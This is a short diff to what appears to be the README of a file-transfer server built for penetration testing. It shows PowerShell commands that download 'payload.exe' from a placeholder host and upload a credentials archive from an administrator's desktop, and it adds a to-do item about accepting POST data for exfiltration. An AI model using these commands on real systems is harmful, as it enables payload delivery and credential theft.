@@ -21,3 +21,7 @@ Download file
 `Invoke-WebRequest -Uri http://[host.ip]:8080/payload.exe -OutFile payload.exe`  
 Upload file  
 `Invoke-Restmethod -uri http://[host.ip]:8080/credentials.zip -Method Put -Infile C:\\users\\administrator\\desktop\\credentials`  
+
+Pending issue:
+- Change to PUT method instead of using POST to upload file using UI
+- Modify the POST handler to accept normal POST data which can be used for data exfiltration. Currently not supported.
